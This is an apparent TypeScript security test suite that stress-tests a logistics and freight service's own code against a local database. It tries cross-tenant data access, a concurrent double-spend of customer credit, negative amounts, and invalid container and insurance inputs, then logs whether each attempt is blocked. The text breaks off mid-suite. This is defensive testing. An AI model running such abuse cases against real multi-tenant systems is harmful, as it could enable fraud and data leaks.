import 'dotenv/config';
import { Pool } from 'pg';
import { Kysely, PostgresDialect } from 'kysely';
import { Database } from '../src/database/database.types';
import { AccountingPostingService } from '../src/modules/accounting/accounting-posting.service';
import { AccountingTenantFoundationService } from '../src/modules/accounting/accounting-tenant-foundation.service';
import { MaritimeFreightService } from '../src/modules/maritime-freight/maritime-freight.service';
import { AuthContext } from '../src/core/auth/interfaces/auth-context.interface';
import { checkInsuranceClaim } from '../src/modules/maritime-freight/engines/cargo-insurance.engine';
import { calculateFreightAudit } from '../src/modules/maritime-freight/engines/freight-audit.engine';
import {
  calculateAirChargeableWeight,
  validateIataAwbNumber,
} from '../src/modules/maritime-freight/engines/air-freight.engine';
import {
  calculateTrucksRequired,
  validateCmrWaybillNumber,
} from '../src/modules/maritime-freight/engines/road-freight.engine';

// ============================================================================
// LOGISTICS CHAOS MONKEY & ADVERSARIAL SABOTEUR SUITE
// ============================================================================
// Purpose: Stress-test the full logistics/maritime/freight shipping module across
// all states, acting as an adversarial saboteur to uncover edge cases, race conditions,
// financial loopholes, cross-tenant leaks, and stability vulnerabilities.
// ============================================================================

interface AttackResult {
  campaign: string;
  testId: string;
  name: string;
  attackVector: string;
  verdict: 'BLOCKED' | 'EXPLOIT_FOUND' | 'CRASH';
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'INFO';
  expectedBehavior: string;
  actualOutcome: string;
  notes?: string;
}

const results: AttackResult[] = [];

function recordResult(r: AttackResult) {
  results.push(r);
  const icon =
    r.verdict === 'BLOCKED'
      ? '🛡️ [BLOCKED]'
      : r.verdict === 'EXPLOIT_FOUND'
        ? '⚠️ [EXPLOIT FOUND]'
        : '❌ [FATAL CRASH]';
  const color = r.verdict === 'BLOCKED' ? '\x1b[32m' : r.verdict === 'EXPLOIT_FOUND' ? '\x1b[33m' : '\x1b[31m';
  console.log(`  ${color}${icon}\x1b[0m ${r.testId} - ${r.name}`);
  console.log(`     Vector:   ${r.attackVector}`);
  console.log(`     Outcome:  ${r.actualOutcome.substring(0, 140)}`);
}

async function runChaosSabotage() {
  console.log('\n\x1b[1m\x1b[35m' + '='.repeat(85));
  console.log('   🏴‍☠️  LOGISTICS CHAOS MONKEY & ADVERSARIAL SABOTEUR ENGINE  🏴‍☠️');
  console.log('   Target: Z-Systems Complete Multimodal Logistics & Freight Module');
  console.log('   Mode:   Maximum Adversarial Chaos & Vulnerability Fuzzing');
  console.log('='.repeat(85) + '\x1b[0m\n');

  const pool = new Pool({
    host: process.env.DATABASE_HOST || '127.0.0.1',
    port: Number(process.env.DATABASE_PORT || 5433),
    user: process.env.DATABASE_USER || 'postgres',
    password: process.env.DATABASE_PASSWORD || 'postgres',
    database: process.env.DATABASE_NAME || 'zs_dev',
    max: 15,
  });

  const db = new Kysely<Database>({ dialect: new PostgresDialect({ pool }) });

  // Mock external email & WhatsApp connectors to prevent network I/O
  const mailMock: any = {
    sendEmail: async () => ({ success: true }),
    getMailSettings: async () => null,
    dispatchRfqEmails: async () => ({ success: true, count: 1 }),
  };
  const waMock: any = {
    sendRawMessage: async () => ({ success: true }),
  };

  const service = new MaritimeFreightService(
    db,
    mailMock,
    waMock,
    new AccountingPostingService(new AccountingTenantFoundationService()),
  );

  // Setup distinct tenants for multi-tenant isolation testing
  const primaryTenantId = 'chaos-logistics-t1';
  const attackerTenantId = 'rogue-attacker-t2';

  // Find a valid user ID from existing database
  const firstUser = await db.selectFrom('users').select('id').limit(1).executeTakeFirst();
  const validUserId = firstUser ? Number(firstUser.id) : 1;

  const authT1: AuthContext = {
    userId: validUserId,
    sessionId: 'chaos-session-t1',
    username: 'legit-dispatcher',
    role: 'admin',
    tenantId: primaryTenantId,
    accountId: primaryTenantId,
    permissions: ['*'],
  };

  const authAttacker: AuthContext = {
    userId: validUserId,
    sessionId: 'chaos-session-t2',
    username: 'rogue-competitor',
    role: 'admin',
    tenantId: attackerTenantId,
    accountId: attackerTenantId,
    permissions: ['*'],
  };

  // Seed / ensure test tenants & baseline master data
  console.log('\x1b[36m[*] Initializing isolated chaos testing sandbox & test tenants...\x1b[0m');
  for (const tid of [primaryTenantId, attackerTenantId]) {
    // Pre-cleanup leftover data from previous runs if any
    await db
      .deleteFrom('maritime_containers')
      .where('tenant_id', '=', tid)
      .execute()
      .catch(() => {});
    await db
      .deleteFrom('maritime_warehouse_receipts')
      .where('tenant_id', '=', tid)
      .execute()
      .catch(() => {});
    await db
      .deleteFrom('maritime_cargo_insurances')
      .where('tenant_id', '=', tid)
      .execute()
      .catch(() => {});
    await db
      .deleteFrom('maritime_job_charges')
      .where('tenant_id', '=', tid)
      .execute()
      .catch(() => {});
    await db
      .deleteFrom('maritime_quotations')
      .where('tenant_id', '=', tid)
      .execute()
      .catch(() => {});
    await db
      .deleteFrom('maritime_rfq_bids')
      .where('tenant_id', '=', tid)
      .execute()
      .catch(() => {});
    await db
      .deleteFrom('maritime_rfqs')
      .where('tenant_id', '=', tid)
      .execute()
      .catch(() => {});
    await db
      .deleteFrom('maritime_inquiries')
      .where('tenant_id', '=', tid)
      .execute()
      .catch(() => {});
    await db
      .deleteFrom('maritime_jobs')
      .where('tenant_id', '=', tid)
      .execute()
      .catch(() => {});
    await db
      .deleteFrom('maritime_rate_cards')
      .where('tenant_id', '=', tid)
      .execute()
      .catch(() => {});
    await db
      .deleteFrom('customer_ledger')
      .where('tenant_id', '=', tid)
      .execute()
      .catch(() => {});
    await db
      .deleteFrom('customers')
      .where('tenant_id', '=', tid)
      .execute()
      .catch(() => {});
    await db
      .deleteFrom('journal_entry_lines')
      .where('tenant_id', '=', tid)
      .execute()
      .catch(() => {});
    await db
      .deleteFrom('journal_entries')
      .where('tenant_id', '=', tid)
      .execute()
      .catch(() => {});
    await db
      .deleteFrom('cost_centers')
      .where('tenant_id', '=', tid)
      .execute()
      .catch(() => {});
    await db
      .deleteFrom('accounting_settings')
      .where('tenant_id', '=', tid)
      .execute()
      .catch(() => {});
    await db
      .deleteFrom('currency_exchange_rates')
      .where('tenant_id', '=', tid)
      .execute()
      .catch(() => {});
    await db
      .deleteFrom('accounting_accounts')
      .where('tenant_id', '=', tid)
      .execute()
      .catch(() => {});

    await db
      .insertInto('tenants')
      .values({
        id: tid,
        slug: tid,
        business_name: `Test Logistics Co (${tid})`,
        owner_name: 'Test Admin',
        owner_phone: '01011112222',
        owner_email: `${tid}@test.zsystems.com`,
        plan_id: 'plan_ultimate',
        activity_type: 'logistics',
        status: 'active',
        trial_starts_at: new Date(),
        trial_ends_at: new Date(Date.now() + 30 * 86400000),
        activated_at: new Date(),
      } as any)
      .onConflict((oc) => oc.column('id').doNothing())
      .execute();
  }

  // Ensure accounts for financial journals in accounting_accounts
  for (const tid of [primaryTenantId, attackerTenantId]) {
    const accs = [
      {
        code: '1130',
        name_ar: 'العملاء - حسابات مدينة',
        name_en: 'Accounts Receivable',
        type: 'asset',
        group: 'current_assets',
      },
      {
        code: '1170',
        name_ar: 'أمانات وتأمينات الحاويات لدى الخطوط الملاحية',
        name_en: 'Container Deposits Held',
        type: 'asset',
        group: 'current_assets',
      },
      {
        code: '4200',
        name_ar: 'إيرادات خدمات الشحن واللوجستيات',
        name_en: 'Logistics Revenue',
        type: 'revenue',
        group: 'operating_revenue',
      },
      {
        code: '6400',
        name_ar: 'تكلفة خدمات الشحن والنقل',
        name_en: 'Freight Operating Cost',
        type: 'expense',
        group: 'operating_expenses',
      },
      {
        code: '2110',
        name_ar: 'موردون وخطوط ملاحية - حسابات دائنة',
        name_en: 'Accounts Payable',
        type: 'liability',
        group: 'current_liabilities',
      },
      {
        code: '1110',
        name_ar: 'الخزينة النقدية الرئيسية',
        name_en: 'Cash on Hand',
        type: 'asset',
        group: 'current_assets',
      },
    ];
    for (const a of accs) {
      await db
        .insertInto('accounting_accounts')
        .values({
          tenant_id: tid,
          account_id: tid,
          code: a.code,
          name_ar: a.name_ar,
          name_en: a.name_en,
          account_type: a.type as any,
          account_group: a.group,
          normal_balance: a.type === 'asset' || a.type === 'expense' ? 'debit' : 'credit',
          is_active: true,
          is_system: true,
          allow_manual_entries: true,
          is_control_account: false,
          is_cash_bank: a.code === '1110',
        } as any)
        .onConflict((oc) => oc.columns(['tenant_id', 'code']).doNothing())
        .execute();
    }

    // Seed base currency EGP exchange rate
    await db
      .insertInto('currency_exchange_rates')
      .values({
        tenant_id: tid,
        account_id: tid,
        currency_code: 'EGP',
        currency_name: 'Egyptian Pound',
        exchange_rate: 1,
        is_base: true,
        symbol: 'EGP',
      } as any)
      .onConflict((oc) => oc.columns(['tenant_id', 'currency_code']).doNothing())
      .execute();

    await db
      .insertInto('currency_exchange_rates')
      .values({
        tenant_id: tid,
        account_id: tid,
        currency_code: 'USD',
        currency_name: 'US Dollar',
        exchange_rate: 50,
        is_base: false,
        symbol: '$',
      } as any)
      .onConflict((oc) => oc.columns(['tenant_id', 'currency_code']).doNothing())
      .execute();
  }

  // Create test customer in Tenant 1 with advance credit (balance = -150,000 EGP)
  const [custT1] = await db
    .insertInto('customers')
    .values({
      tenant_id: primaryTenantId,
      account_id: primaryTenantId,
      name: 'شركة الاستيراد الدولية للضحية',
      phone: '01234567890',
      balance: -150000, // 150k advance credit
    } as any)
    .returningAll()
    .execute();

  // Create test customer in Attacker Tenant 2
  const [custAttacker] = await db
    .insertInto('customers')
    .values({
      tenant_id: attackerTenantId,
      account_id: attackerTenantId,
      name: 'شركة المهاجم الوهمية',
      phone: '01999999999',
      balance: 50000, // Debtor
    } as any)
    .returningAll()
    .execute();

  console.log(`[+] Test environments ready:`);
  console.log(`    Tenant 1 (Victim):   ${primaryTenantId} | Customer: #${custT1.id} (Credit: 150,000 EGP)`);
  console.log(`    Tenant 2 (Attacker): ${attackerTenantId} | Customer: #${custAttacker.id}\n`);

  try {
    // ========================================================================
    // CAMPAIGN 1: Cross-Tenant Data Hijacking & Boundary Assault
    // ========================================================================
    console.log('\x1b[1m\x1b[33m--- [CAMPAIGN 1] Cross-Tenant Data Hijacking & Tenant Boundary Assault ---\x1b[0m');

    // 1.1 Create legit job in Tenant 1
    const legitJobT1 = await service.createJob(authT1, {
      customerId: Number(custT1.id),
      customerName: custT1.name,
      shippingLineName: 'CMA CGM',
      direction: 'import',
      polCode: 'CNSHA',
      polName: 'Shanghai Port',
      podCode: 'EGALY',
      podName: 'Alexandria Port',
      notes: 'شحنة سرية تابعة للشركة الأولى',
    });

    // Attack 1.1: Attacker tries to read Tenant 1's job
    try {
      await service.getJobById(authAttacker, String(legitJobT1.id));
      recordResult({
        campaign: 'CAMPAIGN 1',
        testId: 'ATTACK-1.1',
        name: 'Cross-Tenant Job Read Leak',
        attackVector: 'Attacker requests job details of another tenant by ID',
        verdict: 'EXPLOIT_FOUND',
        severity: 'CRITICAL',
        expectedBehavior: 'Throws NotFoundException or ForbiddenException',
        actualOutcome: 'Attacker was able to inspect private job data of another tenant!',
      });
    } catch (err: any) {
      recordResult({
        campaign: 'CAMPAIGN 1',
        testId: 'ATTACK-1.1',
        name: 'Cross-Tenant Job Read Isolation',
        attackVector: 'Attacker requests job details of another tenant by ID',
        verdict: 'BLOCKED',
        severity: 'CRITICAL',
        expectedBehavior: 'Throws NotFoundException or ForbiddenException',
        actualOutcome: `Blocked securely with: ${err.message}`,
      });
    }

    // Attack 1.2: Attacker tries to mutate Tenant 1's job
    try {
      await service.updateJob(authAttacker, String(legitJobT1.id), {
        notes: 'HACKED BY ROGUE TENANT',
      });
      recordResult({
        campaign: 'CAMPAIGN 1',
        testId: 'ATTACK-1.2',
        name: 'Cross-Tenant Job Mutation Tampering',
        attackVector: 'Attacker attempts to update another tenant job status and notes',
        verdict: 'EXPLOIT_FOUND',
        severity: 'CRITICAL',
        expectedBehavior: 'Throws NotFoundException or ForbiddenException',
        actualOutcome: 'Attacker modified foreign job record!',
      });
    } catch (err: any) {
      recordResult({
        campaign: 'CAMPAIGN 1',
        testId: 'ATTACK-1.2',
        name: 'Cross-Tenant Job Mutation Block',
        attackVector: 'Attacker attempts to update another tenant job status and notes',
        verdict: 'BLOCKED',
        severity: 'CRITICAL',
        expectedBehavior: 'Throws NotFoundException or ForbiddenException',
        actualOutcome: `Blocked securely with: ${err.message}`,
      });
    }

    // Attack 1.3: Attacker attaches warehouse receipt to Tenant 1's job
    try {
      await service.createWarehouseReceipt(authAttacker, {
        jobId: String(legitJobT1.id),
        packageCount: 50,
        grossWeightKg: 1000,
        cbm: 5,
      });
      recordResult({
        campaign: 'CAMPAIGN 1',
        testId: 'ATTACK-1.3',
        name: 'Cross-Tenant Warehouse Receipt Injection',
        attackVector: 'Attacker binds their warehouse receipt to Victim job ID',
        verdict: 'EXPLOIT_FOUND',
        severity: 'CRITICAL',
        expectedBehavior: 'Throws assertJobBelongsToTenant error',
        actualOutcome: 'Attacker injected warehouse receipt into foreign job!',
      });
    } catch (err: any) {
      recordResult({
        campaign: 'CAMPAIGN 1',
        testId: 'ATTACK-1.3',
        name: 'Cross-Tenant Warehouse Receipt Guard',
        attackVector: 'Attacker binds their warehouse receipt to Victim job ID',
        verdict: 'BLOCKED',
        severity: 'CRITICAL',
        expectedBehavior: 'Throws assertJobBelongsToTenant error',
        actualOutcome: `Blocked securely with: ${err.message}`,
      });
    }

    // Attack 1.4: Attacker settles their own job using Victim customer credit
    const attackerJob = await service.createJob(authAttacker, {
      customerId: Number(custAttacker.id),
      customerName: custAttacker.name,
      shippingLineName: 'Hapag Lloyd',
      polCode: 'CNSHA',
      polName: 'Shanghai Port',
      podCode: 'EGPSD',
      podName: 'Port Said Port',
    });
    try {
      await service.settleJobFromCustomerBalance(authAttacker, String(legitJobT1.id), { amount: 50000 });
      recordResult({
        campaign: 'CAMPAIGN 1',
        testId: 'ATTACK-1.4',
        name: 'Cross-Tenant Customer Balance Robbery',
        attackVector: 'Attacker invokes settleJobFromCustomerBalance on victim job',
        verdict: 'EXPLOIT_FOUND',
        severity: 'CRITICAL',
        expectedBehavior: 'Throws NotFoundException / tenant mismatch',
        actualOutcome: 'Attacker settled victim job using customer credit!',
      });
    } catch (err: any) {
      recordResult({
        campaign: 'CAMPAIGN 1',
        testId: 'ATTACK-1.4',
        name: 'Cross-Tenant Balance Robbery Block',
        attackVector: 'Attacker invokes settleJobFromCustomerBalance on victim job',
        verdict: 'BLOCKED',
        severity: 'CRITICAL',
        expectedBehavior: 'Throws NotFoundException / tenant mismatch',
        actualOutcome: `Blocked securely with: ${err.message}`,
      });
    }

    // ========================================================================
    // CAMPAIGN 2: Financial Integrity, Race Conditions & Ledger Sabotage
    // ========================================================================
    console.log('\n\x1b[1m\x1b[33m--- [CAMPAIGN 2] Financial Integrity, Race Conditions & Ledger Sabotage ---\x1b[0m');

    // Setup an invoiced job in Tenant 1 with 150,000 EGP invoice
    await db
      .updateTable('maritime_jobs')
      .set({ client_invoiced_total: 150000, client_paid_total: 0 } as any)
      .where('id', '=', legitJobT1.id as any)
      .execute();

    // Attack 2.1: The Double-Spend Concurrency Hammer (MTR-CONCURRENCY-5X)
    // Customer has 150,000 credit. Fire 5 concurrent settlements of 100,000 each (Total = 500,000)!
    console.log(
      '  [*] Launching 5 concurrent settlement attacks on customer credit (Total 500,000 against 150,000 credit)...',
    );
    const hammerResults = await Promise.allSettled([
      service.settleJobFromCustomerBalance(authT1, String(legitJobT1.id), { amount: 100000 }),
      service.settleJobFromCustomerBalance(authT1, String(legitJobT1.id), { amount: 100000 }),
      service.settleJobFromCustomerBalance(authT1, String(legitJobT1.id), { amount: 100000 }),
      service.settleJobFromCustomerBalance(authT1, String(legitJobT1.id), { amount: 100000 }),
      service.settleJobFromCustomerBalance(authT1, String(legitJobT1.id), { amount: 100000 }),
    ]);

    // Inspect customer balance post-hammer
    const postHammerCust = await db
      .selectFrom('customers')
      .select(['balance'])
      .where('tenant_id', '=', primaryTenantId)
      .where('id', '=', custT1.id as any)
      .executeTakeFirst();
    const finalBal = Number(postHammerCust?.balance ?? 0);

    const postHammerJob = await db
      .selectFrom('maritime_jobs')
      .select(['client_invoiced_total', 'client_paid_total', 'payment_status'])
      .where('id', '=', legitJobT1.id as any)
      .executeTakeFirst();

    const succeededSettlements = hammerResults.filter((r) => r.status === 'fulfilled').length;
    const failedSettlements = hammerResults.filter((r) => r.status === 'rejected').length;

    if (finalBal > 0) {
      recordResult({
        campaign: 'CAMPAIGN 2',
        testId: 'ATTACK-2.1',
        name: 'Concurrent Credit Double-Spend Exploited',
        attackVector: '5 concurrent settlement requests of 100,000 against 150,000 balance',
        verdict: 'EXPLOIT_FOUND',
        severity: 'CRITICAL',
        expectedBehavior: 'Pessimistic row locking ensures customer balance never exceeds 0',
        actualOutcome: `Customer balance was breached into positive debt: ${finalBal} EGP! Total settled exceeds credit!`,
      });
    } else {
      recordResult({
        campaign: 'CAMPAIGN 2',
        testId: 'ATTACK-2.1',
        name: 'Pessimistic Row-Locking Protected Credit Balance',
        attackVector: '5 concurrent settlement requests of 100,000 against 150,000 balance',
        verdict: 'BLOCKED',
        severity: 'CRITICAL',
        expectedBehavior: 'Pessimistic row locking ensures customer balance never exceeds 0',
        actualOutcome: `Pessimistic lock held! Succeeded: ${succeededSettlements}, Blocked: ${failedSettlements}. Customer balance: ${finalBal} EGP, Job paid: ${postHammerJob?.client_paid_total} EGP`,
      });
    }

    // Attack 2.2: Negative Settlement Amount (-50,000 EGP)
    try {
      await service.settleJobFromCustomerBalance(authT1, String(legitJobT1.id), { amount: -50000 });
      recordResult({
        campaign: 'CAMPAIGN 2',
        testId: 'ATTACK-2.2',
        name: 'Negative Settlement Amount Injection',
        attackVector: 'Passing amount = -50,000 to settleJobFromCustomerBalance',
        verdict: 'EXPLOIT_FOUND',
        severity: 'HIGH',
        expectedBehavior: 'Throws BadRequestException or ignores negative amount',
        actualOutcome: 'Negative settlement executed!',
      });
    } catch (err: any) {
      recordResult({
        campaign: 'CAMPAIGN 2',
        testId: 'ATTACK-2.2',
        name: 'Negative Settlement Amount Guard',
        attackVector: 'Passing amount = -50,000 to settleJobFromCustomerBalance',
        verdict: 'BLOCKED',
        severity: 'HIGH',
        expectedBehavior: 'Throws BadRequestException or ignores negative amount',
        actualOutcome: `Blocked securely with: ${err.message}`,
      });
    }

    // Attack 2.3: Settling Job for Debtor Customer (Zero/Positive Credit)
    try {
      await service.settleJobFromCustomerBalance(authAttacker, String(attackerJob.id), { amount: 10000 });
      recordResult({
        campaign: 'CAMPAIGN 2',
        testId: 'ATTACK-2.3',
        name: 'Settlement from Debtor Account',
        attackVector: 'Attempting to settle from a customer whose balance is positive (+50,000)',
        verdict: 'EXPLOIT_FOUND',
        severity: 'HIGH',
        expectedBehavior: 'Throws BadRequestException: no available credit',
        actualOutcome: 'Settled from debtor account without available credit!',
      });
    } catch (err: any) {
      recordResult({
        campaign: 'CAMPAIGN 2',
        testId: 'ATTACK-2.3',
        name: 'Debtor Settlement Rejection Guard',
        attackVector: 'Attempting to settle from a customer whose balance is positive (+50,000)',
        verdict: 'BLOCKED',
        severity: 'HIGH',
        expectedBehavior: 'Throws BadRequestException: no available credit',
        actualOutcome: `Blocked securely with: ${err.message}`,
      });
    }

    // Attack 2.4: Negative Sales Invoice Issuance (-50,000 EGP)
    try {
      await service.issueJobSalesInvoice(authT1, String(legitJobT1.id), {
        amount: -50000,
        currency: 'EGP',
        notes: 'Negative invoice attack',
      });
      recordResult({
        campaign: 'CAMPAIGN 2',
        testId: 'ATTACK-2.4',
        name: 'Negative Sales Invoice Issuance',
        attackVector: 'Passing amount = -50,000 to issueJobSalesInvoice',
        verdict: 'EXPLOIT_FOUND',
        severity: 'HIGH',
        expectedBehavior: 'Throws BadRequestException: invoice amount must be positive',
        actualOutcome: 'Negative sales invoice posted to general ledger!',
      });
    } catch (err: any) {
      recordResult({
        campaign: 'CAMPAIGN 2',
        testId: 'ATTACK-2.4',
        name: 'Negative Sales Invoice Guard',
        attackVector: 'Passing amount = -50,000 to issueJobSalesInvoice',
        verdict: 'BLOCKED',
        severity: 'HIGH',
        expectedBehavior: 'Throws BadRequestException: invoice amount must be positive',
        actualOutcome: `Blocked securely with: ${err.message}`,
      });
    }

    // Attack 2.5: Zero / Negative Foreign Exchange Rate (-50.0 EGP/USD)
    try {
      await service.calculateJobForexGainLoss(authT1, String(legitJobT1.id), -50);
      recordResult({
        campaign: 'CAMPAIGN 2',
        testId: 'ATTACK-2.5',
        name: 'Negative ROE Forex Gain/Loss',
        attackVector: 'Passing actualRoe = -50 to calculateJobForexGainLoss',
        verdict: 'EXPLOIT_FOUND',
        severity: 'MEDIUM',
        expectedBehavior: 'Throws BadRequestException: exchange rate must be positive',
        actualOutcome: 'Negative ROE processed in forex calculation!',
      });
    } catch (err: any) {
      recordResult({
        campaign: 'CAMPAIGN 2',
        testId: 'ATTACK-2.5',
        name: 'Negative ROE Forex Guard',
        attackVector: 'Passing actualRoe = -50 to calculateJobForexGainLoss',
        verdict: 'BLOCKED',
        severity: 'MEDIUM',
        expectedBehavior: 'Throws BadRequestException: exchange rate must be positive',
        actualOutcome: `Blocked securely with: ${err.message}`,
      });
    }

    // Attack 2.6: Job Completion Financial Invariant Bypass
    await db
      .insertInto('maritime_job_charges')
      .values({
        tenant_id: primaryTenantId,
        job_id: String(legitJobT1.id) as any,
        charge_code: 'THC_ORGN',
        charge_name_ar: 'تفريغ ونولون غير مفوتر',
        charge_name_en: 'Terminal Handling',
        cost_amount: 80000,
        sell_amount: 95000,
        currency: 'EGP',
        is_invoiced: false,
      } as any)
      .execute();

    try {
      await service.updateJob(authT1, String(legitJobT1.id), { status: 'completed' });
      recordResult({
        campaign: 'CAMPAIGN 2',
        testId: 'ATTACK-2.6',
        name: 'Unbilled Expense Job Closure Bypass',
        attackVector: 'Attempting to mark job completed with 80,000 unbilled charge',
        verdict: 'EXPLOIT_FOUND',
        severity: 'CRITICAL',
        expectedBehavior: 'assertJobCanClose blocks closure due to unbilled charge',
        actualOutcome: 'Job was marked completed despite unbilled charges!',
      });
    } catch (err: any) {
      recordResult({
        campaign: 'CAMPAIGN 2',
        testId: 'ATTACK-2.6',
        name: 'Unbilled Expense Closure Guard',
        attackVector: 'Attempting to mark job completed with 80,000 unbilled charge',
        verdict: 'BLOCKED',
        severity: 'CRITICAL',
        expectedBehavior: 'assertJobCanClose blocks closure due to unbilled charge',
        actualOutcome: `Blocked securely with: ${err.message}`,
      });
    }

    // ========================================================================
    // CAMPAIGN 3: Container Demurrage Radar & Deposit Sabotage
    // ========================================================================
    console.log('\n\x1b[1m\x1b[33m--- [CAMPAIGN 3] Container Demurrage Radar & Deposit Sabotage ---\x1b[0m');

    let testContainer: any;
    try {
      testContainer = await service.createContainer(authT1, {
        jobId: String(legitJobT1.id),
        containerNumber: 'MSKU9988776',
        containerType: "40' HC",
        sealNumber: 'SEAL-001',
        freeDays: 14,
        demurrageRatePerDay: 50,
        depositAmount: 10000,
        depositCurrency: 'EGP',
        depositStatus: 'held_by_line',
      });
      console.log(`    [+] Container #${testContainer.container_number} created with deposit accounting.`);
    } catch (e: any) {
      // Fallback container creation without deposit if accounting account 1170 missing
      testContainer = await service.createContainer(authT1, {
        jobId: String(legitJobT1.id),
        containerNumber: 'MSKU9988776',
        containerType: "40' HC",
        sealNumber: 'SEAL-001',
        freeDays: 14,
        demurrageRatePerDay: 50,
      });
    }

    // Attack 3.1: Time-Travel Container Attack (Return date before discharge date)
    try {
      await service.updateContainer(authT1, String(testContainer.id), {
        dischargedAt: '2026-10-20T10:00:00Z',
        emptyReturnedAt: '2026-10-05T10:00:00Z', // 15 days before discharge!
      });
      recordResult({
        campaign: 'CAMPAIGN 3',
        testId: 'ATTACK-3.1',
        name: 'Time-Travel Container Return Before Discharge',
        attackVector: 'Setting emptyReturnedAt (Oct 5) < dischargedAt (Oct 20)',
        verdict: 'EXPLOIT_FOUND',
        severity: 'HIGH',
        expectedBehavior: 'Throws BadRequestException: return date cannot precede discharge',
        actualOutcome: 'Accepted invalid timeline with return date before discharge!',
      });
    } catch (err: any) {
      recordResult({
        campaign: 'CAMPAIGN 3',
        testId: 'ATTACK-3.1',
        name: 'Container Chronology Guard',
        attackVector: 'Setting emptyReturnedAt (Oct 5) < dischargedAt (Oct 20)',
        verdict: 'BLOCKED',
        severity: 'HIGH',
        expectedBehavior: 'Throws BadRequestException: return date cannot precede discharge',
        actualOutcome: `Blocked securely with: ${err.message}`,
      });
    }

    // Attack 3.2: Negative Free Days Attack (-15 free days)
    try {
      await service.updateContainer(authT1, String(testContainer.id), {
        freeDays: -15,
      });
      recordResult({
        campaign: 'CAMPAIGN 3',
        testId: 'ATTACK-3.2',
        name: 'Negative Free Days Attack',
        attackVector: 'Setting freeDays = -15',
        verdict: 'EXPLOIT_FOUND',
        severity: 'HIGH',
        expectedBehavior: 'Throws BadRequestException: free days must be non-negative integer',
        actualOutcome: 'Negative free days accepted!',
      });
    } catch (err: any) {
      recordResult({
        campaign: 'CAMPAIGN 3',
        testId: 'ATTACK-3.2',
        name: 'Negative Free Days Guard',
        attackVector: 'Setting freeDays = -15',
        verdict: 'BLOCKED',
        severity: 'HIGH',
        expectedBehavior: 'Throws BadRequestException: free days must be non-negative integer',
        actualOutcome: `Blocked securely with: ${err.message}`,
      });
    }

    // Attack 3.3: Negative Daily Demurrage Rate (-100 USD/day)
    try {
      await service.updateContainer(authT1, String(testContainer.id), {
        demurrageRatePerDay: -100,
      });
      recordResult({
        campaign: 'CAMPAIGN 3',
        testId: 'ATTACK-3.3',
        name: 'Negative Daily Demurrage Rate Attack',
        attackVector: 'Setting demurrageRatePerDay = -100',
        verdict: 'EXPLOIT_FOUND',
        severity: 'HIGH',
        expectedBehavior: 'Throws BadRequestException: demurrage rate must be non-negative',
        actualOutcome: 'Negative demurrage rate accepted!',
      });
    } catch (err: any) {
      recordResult({
        campaign: 'CAMPAIGN 3',
        testId: 'ATTACK-3.3',
        name: 'Demurrage Rate Guard',
        attackVector: 'Setting demurrageRatePerDay = -100',
        verdict: 'BLOCKED',
        severity: 'HIGH',
        expectedBehavior: 'Throws BadRequestException: demurrage rate must be non-negative',
        actualOutcome: `Blocked securely with: ${err.message}`,
      });
    }

    // Attack 3.4: Post-Settlement Deposit Reopening
    try {
      await service.updateContainer(authT1, String(testContainer.id), {
        depositStatus: 'refunded_to_treasury',
      });
      await service.updateContainer(authT1, String(testContainer.id), {
        depositStatus: 'held_by_line', // Attempting to reopen already settled deposit
      });
      recordResult({
        campaign: 'CAMPAIGN 3',
        testId: 'ATTACK-3.4',
        name: 'Container Deposit Settled Reopening',
        attackVector: 'Attempting to reopen a deposit already refunded to treasury',
        verdict: 'EXPLOIT_FOUND',
        severity: 'CRITICAL',
        expectedBehavior: 'Throws BadRequestException: cannot reopen settled deposit',
        actualOutcome: 'Settled deposit was reopened!',
      });
    } catch (err: any) {
      recordResult({
        campaign: 'CAMPAIGN 3',
        testId: 'ATTACK-3.4',
        name: 'Deposit Liquidation Guard',
        attackVector: 'Attempting to reopen a deposit already refunded to treasury',
        verdict: 'BLOCKED',
        severity: 'CRITICAL',
        expectedBehavior: 'Throws BadRequestException: cannot reopen settled deposit',
        actualOutcome: `Blocked securely with: ${err.message}`,
      });
    }

    // ========================================================================
    // CAMPAIGN 4: Cargo Insurance & Claims Sabotage
    // ========================================================================
    console.log('\n\x1b[1m\x1b[33m--- [CAMPAIGN 4] Cargo Insurance & Claims Sabotage ---\x1b[0m');

    const insPolicy = await service.createCargoInsurance(authT1, {
      jobId: String(legitJobT1.id),
      policyNumber: 'INS-TEST-001',
      insuranceCompany: 'Misr Insurance Co',
      insuredValue: 100000,
      currency: 'EGP',
      premiumAmount: 1500,
      coverageType: 'all_risks',
    });

    // Attack 4.1: Claim Exceeding Insured Value (Claim 5,000,000 on 100,000 policy)
    try {
      await service.claimCargoInsurance(authT1, String(insPolicy.id), {
        claimAmount: 5000000,
        claimStatus: 'filed',
        claimNotes: 'Attempting to drain insurance company beyond policy value',
      });
      recordResult({
        campaign: 'CAMPAIGN 4',
        testId: 'ATTACK-4.1',
        name: 'Insurance Claim Exceeding Insured Value',
        attackVector: 'Claim 5,000,000 on a 100,000 policy',
        verdict: 'EXPLOIT_FOUND',
        severity: 'CRITICAL',
        expectedBehavior: 'Throws checkInsuranceClaim EXCEEDS_INSURED_VALUE',
        actualOutcome: 'Claim exceeding insured value accepted!',
      });
    } catch (err: any) {
      recordResult({
        campaign: 'CAMPAIGN 4',
        testId: 'ATTACK-4.1',
        name: 'Insurance Policy Ceiling Guard',
        attackVector: 'Claim 5,000,000 on a 100,000 policy',
        verdict: 'BLOCKED',
        severity: 'CRITICAL',
        expectedBehavior: 'Throws checkInsuranceClaim EXCEEDS_INSURED_VALUE',
        actualOutcome: `Blocked securely with: ${err.message}`,
      });
    }

    // Attack 4.2: Negative Claim Amount (-25,000 EGP)
    try {
      await service.claimCargoInsurance(authT1, String(insPolicy.id), {
        claimAmount: -25000,
        claimStatus: 'filed',
      });
      recordResult({
        campaign: 'CAMPAIGN 4',
        testId: 'ATTACK-4.2',
        name: 'Negative Insurance Claim Amount',
        attackVector: 'Claim amount = -25,000',
        verdict: 'EXPLOIT_FOUND',
        severity: 'HIGH',
        expectedBehavior: 'Throws checkInsuranceClaim INVALID_AMOUNT',
        actualOutcome: 'Negative claim accepted!',
      });
    } catch (err: any) {
      recordResult({
        campaign: 'CAMPAIGN 4',
        testId: 'ATTACK-4.2',
        name: 'Negative Claim Amount Guard',
        attackVector: 'Claim amount = -25,000',
        verdict: 'BLOCKED',
        severity: 'HIGH',
        expectedBehavior: 'Throws checkInsuranceClaim INVALID_AMOUNT',
        actualOutcome: `Blocked securely with: ${err.message}`,
      });
    }

    // Attack 4.3: Double-Claim Replay Attack
